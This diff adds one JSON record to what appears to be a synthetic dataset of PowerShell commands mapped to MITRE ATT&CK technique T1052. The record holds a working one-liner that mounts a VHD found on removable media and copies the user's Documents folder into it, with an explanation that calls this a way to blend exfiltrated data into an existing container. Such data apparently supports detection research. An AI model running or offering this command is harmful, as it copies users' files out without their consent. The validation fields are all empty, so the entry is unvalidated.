@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $img=(Get-ChildItem \"$dl`:\\\" -Filter *.vhd* -Recurse -ErrorAction SilentlyContinue | Select -First 1 -Expand FullName); if($img){ Mount-DiskImage -ImagePath $img -NoDriveLetter:$false; $v=(Get-DiskImage -ImagePath $img | Get-Disk | Get-Partition | Get-Volume | Select -First 1 -Expand DriveLetter); $target=\"$v`:\\$env:USERNAME\"; New-Item -ItemType Directory -Force -Path $target | Out-Null; Copy-Item \"$env:USERPROFILE\\Documents\\*\" -Destination $target -Recurse -Force -ErrorAction SilentlyContinue; Write-Output \"Copied into mounted image $img at $(Get-Date)\" | Out-File \"$dl`:\\mount_op.log\" -Append; Dismount-DiskImage -ImagePath $img }",
+  "explanation": "Mounts a disk image located on a removable drive and writes local documents into it, blending exfil data into an existing VHD/VHDX container.",
+  "rationale_steps": [
+    "Find a VHD/VHDX file on the removable media",
+    "Mount the disk image to obtain a new volume letter",
+    "Copy local files into the mounted image",
+    "Log the action using Write-Output and unmount the image"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-5a0605fc",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
